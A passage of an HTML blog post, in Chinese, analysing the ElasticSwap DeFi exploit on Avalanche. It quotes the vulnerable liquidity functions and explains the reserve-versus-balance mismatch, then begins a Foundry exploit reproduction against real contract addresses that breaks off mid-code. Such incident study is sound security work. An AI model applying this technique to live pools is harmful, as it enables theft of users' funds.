@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+    <!--Description-->
+
+    
+
+    
+        <meta name="description" content="简述部署在avax 和eth 上的ElasticSwap 由于router合约没有fork uniswap 在addLiquidity 和removeLiquidity 采用不同的计算方式导致被攻击 以下以avax为例分析
+漏洞分析添加流动性函数采用的是计算k值的方法
+123456789101112"/>
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="d1rrick"/>
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="ElasticSwap攻击事件分析与复现"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="简述部署在avax 和eth 上的ElasticSwap 由于router合约没有fork uniswap 在addLiquidity 和removeLiquidity 采用不同的计算方式导致被攻击 以下以avax为例分析
+漏洞分析添加流动性函数采用的是计算k值的方法
+123456789101112"/>
+    
+
+    <!--Open Graph Site Name-->
+        <meta property="og:site_name" content="d1rrick&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article"/>
+    
+
+    <!--Page Cover-->
+    
+    
+        <meta property="og:image" content="http://example.comimg/home-bg.jpg"/>
+    
+
+        <meta name="twitter:card" content="summary_large_image"/>
+
+    
+
+    
+        <meta name="twitter:image" content="http://example.comimg/home-bg.jpg"/>
+    
+
+    <!-- Title -->
+    
+    <title>ElasticSwap攻击事件分析与复现 - d1rrick&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
+    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet"/>
+
+    <!-- Google Analytics -->
+    
+
+
+    <!-- favicon -->
+    
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Configurable Title</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                
+                    <li>
+                        <a href="/">
+                            
+                                Home
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/archives">
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a target="_blank" rel="noopener" href="https://github.com/HiT0on">
+                            
+                                <i class="fa fa-github fa-stack-2x"></i>
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/home-bg.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>ElasticSwap攻击事件分析与复现</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2023-01-04
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+                <div class="col-lg-4 col-lg-offset-2 col-md-5 col-md-offset-1 post-tags">
+                    
+                        
+
+
+<a href="/tags/区块链安全/">#区块链安全</a>
+
+
+                    
+                </div>
+                <div class="col-lg-4 col-md-5 post-categories">
+                    
+                </div>
+            
+
+            <!-- Gallery -->
+            
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4><p>部署在avax 和eth 上的ElasticSwap 由于router合约没有fork uniswap 在addLiquidity 和removeLiquidity 采用不同的计算方式导致被攻击 以下以avax为例分析</p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>添加流动性函数采用的是计算k值的方法</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addLiquidity</span>(<span class="params"></span></span><br><span class="line"><span class="params">       uint256 _baseTokenQtyDesired,</span></span><br><span class="line"><span class="params">       uint256 _quoteTokenQtyDesired,</span></span><br><span class="line"><span class="params">       uint256 _baseTokenQtyMin,</span></span><br><span class="line"><span class="params">       uint256 _quoteTokenQtyMin,</span></span><br><span class="line"><span class="params">       address _liquidityTokenRecipient,</span></span><br><span class="line"><span class="params">       uint256 _expirationTimestamp</span></span><br><span class="line"><span class="params">   </span>) external <span class="title function_">nonReentrant</span>() <span class="title function_">isNotExpired</span>(<span class="params">_expirationTimestamp</span>) &#123;</span><br><span class="line">       uint256 totalSupply = <span class="variable language_">this</span>.<span class="title function_">totalSupply</span>();</span><br><span class="line">       <span class="title class_">MathLib</span>.<span class="property">TokenQtys</span> memory tokenQtys =</span><br><span class="line">           <span class="title class_">MathLib</span>.<span class="title function_">calculateAddLiquidityQuantities</span>(</span><br><span class="line">               _baseTokenQtyDesired,</span><br><span class="line">               _quoteTokenQtyDesired,</span><br><span class="line">               _baseTokenQtyMin,</span><br><span class="line">               _quoteTokenQtyMin,</span><br><span class="line">               <span class="title class_">IERC20</span>(baseToken).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)),</span><br><span class="line">               totalSupply,</span><br><span class="line">               internalBalances</span><br><span class="line">           );</span><br><span class="line"></span><br><span class="line">       internalBalances.<span class="property">kLast</span> =</span><br><span class="line">           internalBalances.<span class="property">baseTokenReserveQty</span> *</span><br><span class="line">           internalBalances.<span class="property">quoteTokenReserveQty</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (tokenQtys.<span class="property">liquidityTokenFeeQty</span> != <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">// mint liquidity tokens to fee address for k growth.</span></span><br><span class="line">           <span class="title function_">_mint</span>(</span><br><span class="line">               <span class="title class_">IExchangeFactory</span>(exchangeFactoryAddress).<span class="title function_">feeAddress</span>(),</span><br><span class="line">               tokenQtys.<span class="property">liquidityTokenFeeQty</span></span><br><span class="line">           );</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       bool isExchangeEmpty = totalSupply == <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span> (isExchangeEmpty) &#123;</span><br><span class="line">           <span class="comment">// check if this the first LP provider, if so, we need to lock some minimum dust liquidity.</span></span><br><span class="line">           <span class="built_in">require</span>(</span><br><span class="line">               tokenQtys.<span class="property">liquidityTokenQty</span> &gt; <span class="variable constant_">MINIMUM_LIQUIDITY</span>,</span><br><span class="line">               <span class="string">&quot;Exchange: INITIAL_DEPOSIT_MIN&quot;</span></span><br><span class="line">           );</span><br><span class="line">           unchecked &#123;</span><br><span class="line">               tokenQtys.<span class="property">liquidityTokenQty</span> -= <span class="variable constant_">MINIMUM_LIQUIDITY</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="title function_">_mint</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), <span class="variable constant_">MINIMUM_LIQUIDITY</span>); <span class="comment">// mint to this address, total supply will never be 0 again</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="title function_">_mint</span>(_liquidityTokenRecipient, tokenQtys.<span class="property">liquidityTokenQty</span>); <span class="comment">// mint liquidity tokens to recipient</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (tokenQtys.<span class="property">baseTokenQty</span> != <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">// transfer base tokens to Exchange</span></span><br><span class="line">           <span class="title class_">IERC20</span>(baseToken).<span class="title function_">safeTransferFrom</span>(</span><br><span class="line">               msg.<span class="property">sender</span>,</span><br><span class="line">               <span class="title function_">address</span>(<span class="variable language_">this</span>),</span><br><span class="line">               tokenQtys.<span class="property">baseTokenQty</span></span><br><span class="line">           );</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (isExchangeEmpty) &#123;</span><br><span class="line">               <span class="built_in">require</span>(</span><br><span class="line">                   <span class="title class_">IERC20</span>(baseToken).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)) ==</span><br><span class="line">                       tokenQtys.<span class="property">baseTokenQty</span>,</span><br><span class="line">                   <span class="string">&quot;Exchange: FEE_ON_TRANSFER_NOT_SUPPORTED&quot;</span></span><br><span class="line">               );</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (tokenQtys.<span class="property">quoteTokenQty</span> != <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">// transfer quote tokens to Exchange</span></span><br><span class="line">           <span class="title class_">IERC20</span>(quoteToken).<span class="title function_">safeTransferFrom</span>(</span><br><span class="line">               msg.<span class="property">sender</span>,</span><br><span class="line">               <span class="title function_">address</span>(<span class="variable language_">this</span>),</span><br><span class="line">               tokenQtys.<span class="property">quoteTokenQty</span></span><br><span class="line">           );</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       emit <span class="title class_">AddLiquidity</span>(</span><br><span class="line">           msg.<span class="property">sender</span>,</span><br><span class="line">           tokenQtys.<span class="property">baseTokenQty</span>,</span><br><span class="line">           tokenQtys.<span class="property">quoteTokenQty</span></span><br><span class="line">       );</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>而移除流动性计算应取回多少token 时则采取的是balanceOf()方法 这样就给攻击者创造了机会，只需要操纵pair的余额就存在套利机会</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">removeLiquidity</span>(<span class="params"></span></span><br><span class="line"><span class="params">        uint256 _liquidityTokenQty,</span></span><br><span class="line"><span class="params">        uint256 _baseTokenQtyMin,</span></span><br><span class="line"><span class="params">        uint256 _quoteTokenQtyMin,</span></span><br><span class="line"><span class="params">        address _tokenRecipient,</span></span><br><span class="line"><span class="params">        uint256 _expirationTimestamp</span></span><br><span class="line"><span class="params">    </span>) external <span class="title function_">nonReentrant</span>() <span class="title function_">isNotExpired</span>(<span class="params">_expirationTimestamp</span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="variable language_">this</span>.<span class="title function_">totalSupply</span>() != <span class="number">0</span>, <span class="string">&quot;Exchange: INSUFFICIENT_LIQUIDITY&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            _baseTokenQtyMin != <span class="number">0</span> &amp;&amp; _quoteTokenQtyMin != <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;Exchange: MINS_MUST_BE_GREATER_THAN_ZERO&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        uint256 baseTokenReserveQty =</span><br><span class="line">            <span class="title class_">IERC20</span>(baseToken).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        uint256 quoteTokenReserveQty =</span><br><span class="line">            <span class="title class_">IERC20</span>(quoteToken).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line"></span><br><span class="line">        uint256 totalSupplyOfLiquidityTokens = <span class="variable language_">this</span>.<span class="title function_">totalSupply</span>();</span><br><span class="line">        <span class="comment">// calculate any DAO fees here.</span></span><br><span class="line">        uint256 liquidityTokenFeeQty =</span><br><span class="line">            <span class="title class_">MathLib</span>.<span class="title function_">calculateLiquidityTokenFees</span>(</span><br><span class="line">                totalSupplyOfLiquidityTokens,</span><br><span class="line">                internalBalances</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// we need to factor this quantity in to any total supply before redemption</span></span><br><span class="line">        totalSupplyOfLiquidityTokens += liquidityTokenFeeQty;</span><br><span class="line"></span><br><span class="line">        uint256 baseTokenQtyToReturn =</span><br><span class="line">            (_liquidityTokenQty * baseTokenReserveQty) /</span><br><span class="line">                totalSupplyOfLiquidityTokens;</span><br><span class="line">        uint256 quoteTokenQtyToReturn =</span><br><span class="line">            (_liquidityTokenQty * quoteTokenReserveQty) /</span><br><span class="line">                totalSupplyOfLiquidityTokens;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            baseTokenQtyToReturn &gt;= _baseTokenQtyMin,</span><br><span class="line">            <span class="string">&quot;Exchange: INSUFFICIENT_BASE_QTY&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            quoteTokenQtyToReturn &gt;= _quoteTokenQtyMin,</span><br><span class="line">            <span class="string">&quot;Exchange: INSUFFICIENT_QUOTE_QTY&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// this ensures that we are removing the equivalent amount of decay</span></span><br><span class="line">        <span class="comment">// when this person exits.</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//scoping to avoid stack too deep errors</span></span><br><span class="line">            uint256 internalBaseTokenReserveQty =</span><br><span class="line">                internalBalances.<span class="property">baseTokenReserveQty</span>;</span><br><span class="line">            uint256 baseTokenQtyToRemoveFromInternalAccounting =</span><br><span class="line">                (_liquidityTokenQty * internalBaseTokenReserveQty) /</span><br><span class="line">                    totalSupplyOfLiquidityTokens;</span><br><span class="line"></span><br><span class="line">            internalBalances.<span class="property">baseTokenReserveQty</span> = internalBaseTokenReserveQty =</span><br><span class="line">                internalBaseTokenReserveQty -</span><br><span class="line">                baseTokenQtyToRemoveFromInternalAccounting;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// We should ensure no possible overflow here.</span></span><br><span class="line">            uint256 internalQuoteTokenReserveQty =</span><br><span class="line">                internalBalances.<span class="property">quoteTokenReserveQty</span>;</span><br><span class="line">            <span class="keyword">if</span> (quoteTokenQtyToReturn &gt; internalQuoteTokenReserveQty) &#123;</span><br><span class="line">                internalBalances</span><br><span class="line">                    .<span class="property">quoteTokenReserveQty</span> = internalQuoteTokenReserveQty = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                internalBalances</span><br><span class="line">                    .<span class="property">quoteTokenReserveQty</span> = internalQuoteTokenReserveQty =</span><br><span class="line">                    internalQuoteTokenReserveQty -</span><br><span class="line">                    quoteTokenQtyToReturn;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            internalBalances.<span class="property">kLast</span> =</span><br><span class="line">                internalBaseTokenReserveQty *</span><br><span class="line">                internalQuoteTokenReserveQty;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (liquidityTokenFeeQty != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title function_">_mint</span>(</span><br><span class="line">                <span class="title class_">IExchangeFactory</span>(exchangeFactoryAddress).<span class="title function_">feeAddress</span>(),</span><br><span class="line">                liquidityTokenFeeQty</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">_burn</span>(msg.<span class="property">sender</span>, _liquidityTokenQty);</span><br><span class="line">        <span class="title class_">IERC20</span>(baseToken).<span class="title function_">safeTransfer</span>(_tokenRecipient, baseTokenQtyToReturn);</span><br><span class="line">        <span class="title class_">IERC20</span>(quoteToken).<span class="title function_">safeTransfer</span>(_tokenRecipient, quoteTokenQtyToReturn);</span><br><span class="line">        emit <span class="title class_">RemoveLiquidity</span>(</span><br><span class="line">            msg.<span class="property">sender</span>,</span><br><span class="line">            baseTokenQtyToReturn,</span><br><span class="line">            quoteTokenQtyToReturn</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟踪攻击流程发现出现异常的是这一步，在攻击者第一次移除完流动性之后usdc储备量只剩下0.5</p>
+<p><img src="/img/postimg/Elastic/image-20230103185418158.png" alt="image-20230103185418158"></p>
+<p>是因为在removeLiquidity 方法时会更新两个储备量值</p>
+<p><img src="/img/postimg/Elastic/image-20230103185233921.png" alt="image-20230103185233921"></p>
+<p>上一次记录的储备量为393770263016 移除流动性应该转给攻击者393769763016 两者之差就是500000</p>
+<p>这时相当于池子的TIC代变得非常便宜，所以攻击者先花了一点小钱(50u)把池子的大量TIC代币换了出去，然后在次添加流动性，拿到大量lp，再移除流动性 因为u的数量是按pair 余额计算的 此时pair 里还剩下大量的usdc 只不过没有被计算进reseves 里 如果这个pair fork 的uniswap 直接调用skim()也行 至此攻击者完成套利。</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>使用foundry 复现此漏洞，代码如下：</p>
+<p><strong>forge test –contracts ./src/test/elasticswapexp.sol -vvvv -w</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;forge-std/Test.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./interface.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;forge-std/console.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">ELPExchange</span> is <span class="title class_">IERC20</span>&#123;</span><br><span class="line">    struct <span class="title class_">InternalBalances</span> &#123;</span><br><span class="line">        <span class="comment">// x*y=k - we track these internally to compare to actual balances of the ERC20&#x27;s</span></span><br><span class="line">        <span class="comment">// in order to calculate the &quot;decay&quot; or the amount of balances that are not</span></span><br><span class="line">        <span class="comment">// participating in the pricing curve and adding additional liquidity to swap.</span></span><br><span class="line">        uint256 baseTokenReserveQty; <span class="comment">// x</span></span><br><span class="line">        uint256 quoteTokenReserveQty; <span class="comment">// y</span></span><br><span class="line">        uint256 kLast; <span class="comment">// as of the last add / rem liquidity event</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">internalBalances</span>(<span class="params"></span>) view external  <span class="title function_">returns</span>(<span class="title class_">InternalBalances</span> memory);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">addLiquidity</span>(<span class="params"></span></span><br><span class="line"><span class="params">        uint256 _baseTokenQtyDesired,</span></span><br><span class="line"><span class="params">        uint256 _quoteTokenQtyDesired,</span></span><br><span class="line"><span class="params">        uint256 _baseTokenQtyMin,</span></span><br><span class="line"><span class="params">        uint256 _quoteTokenQtyMin,</span></span><br><span class="line"><span class="params">        address _liquidityTokenRecipient,</span></span><br><span class="line"><span class="params">        uint256 _expirationTimestamp</span></span><br><span class="line"><span class="params">    </span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">removeLiquidity</span>(<span class="params"></span></span><br><span class="line"><span class="params">        uint256 _liquidityTokenQty,</span></span><br><span class="line"><span class="params">        uint256 _baseTokenQtyMin,</span></span><br><span class="line"><span class="params">        uint256 _quoteTokenQtyMin,</span></span><br><span class="line"><span class="params">        address _tokenRecipient,</span></span><br><span class="line"><span class="params">        uint256 _expirationTimestamp</span></span><br><span class="line"><span class="params">    </span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">swapQuoteTokenForBaseToken</span>(<span class="params"></span></span><br><span class="line"><span class="params">        uint256 _quoteTokenQty,</span></span><br><span class="line"><span class="params">        uint256 _minBaseTokenQty,</span></span><br><span class="line"><span class="params">        uint256 _expirationTimestamp</span></span><br><span class="line"><span class="params">    </span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract elasticswapExploit is <span class="title class_">DSTest</span>&#123;</span><br><span class="line">    <span class="title class_">IERC20</span> <span class="variable constant_">TIC</span> = <span class="title class_">IERC20</span>(<span class="number">0x75739a693459f33B1FBcC02099eea3eBCF150cBe</span>);</span><br><span class="line">    <span class="title class_">IERC20</span> <span class="variable constant_">USDC_E</span> = <span class="title class_">IERC20</span>(<span class="number">0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664</span>);</span><br><span class="line">    <span class="title class_">Uni</span>_Pair_V2 <span class="title class_">SPair</span> = <span class="title class_">Uni</span>_Pair_V2(<span class="number">0x4CF9dC05c715812FeAD782DC98de0168029e05C8</span>);</span><br><span class="line">    <span class="title class_">Uni</span>_Pair_V2 <span class="title class_">JPair</span> = <span class="title class_">Uni</span>_Pair_V2(<span class="number">0xA389f9430876455C36478DeEa9769B7Ca4E3DDB1</span>);</span><br><span class="line">    <span class="title class_">ELPExchange</span> elp = <span class="title class_">ELPExchange</span>(<span class="number">0x4ae1Da57f2d6b2E9a23d07e264Aa2B3bBCaeD19A</span>);</span><br><span class="line">    <span class="title class_">CheatCodes</span> cheats = <span class="title class_">CheatCodes</span>(<span class="number">0x7109709ECfa91a80626fF3989D68f67F5b1DD12D</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setUp</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        cheats.<span class="title function_">createSelectFork</span>(<span class="string">&#x27;avax&#x27;</span>,<span class="number">23563709</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// function testFork() public&#123;</span></span><br><span class="line">    <span class="comment">//     console.log(block.number);</span></span><br><span class="line">    <span class="comment">//     assertEq(block.number, 23563709);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testExploit</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        <span class="variable constant_">TIC</span>.<span class="title function_">approve</span>(<span class="title function_">address</span>(elp),<span class="title function_">type</span>(uint).<span class="property">max</span>);</span><br><span class="line">        <span class="variable constant_">USDC_E</span>.<span class="title function_">approve</span>(<span class="title 